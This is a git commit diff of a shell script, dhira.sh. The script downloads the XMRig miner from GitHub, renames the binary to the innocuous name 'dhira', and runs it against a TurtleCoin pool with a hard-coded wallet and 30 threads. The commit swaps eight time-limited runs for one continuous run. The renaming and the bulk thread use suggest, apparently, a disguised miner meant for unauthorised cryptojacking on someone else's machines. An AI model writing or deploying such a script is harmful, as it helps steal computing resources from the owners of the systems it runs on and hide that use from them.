1d77799d25e061aebc5a29b2ed3205b12fa896da
cepdian <97529294+cepdian@users.noreply.github.com>
2022-01-11 21:56:27 +0700

    Update dhira.sh

--- dhira.sh
+++ dhira.sh
@@ -7,19 +7,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux
 tar xf xmrig-6.15.1-linux-x64.tar.gz 
 cd xmrig-6.15.1
 mv xmrig dhira
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
-timeout 30m ./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
-sleep 60
+./dhira -o de.turtlecoin.herominers.com:1160 -u TRTLuz1UTuuV5DeURJAA9yUyRCzBxfsDEj4cb8vvMsWedMTATTbzeGzP5GUt3qmCYSRLMPXd2LZ3bhtz1LwKghVCMW45dWRTC6y -p dd -a argon2/chukwav2 -k  --donate-level=1 -t 30
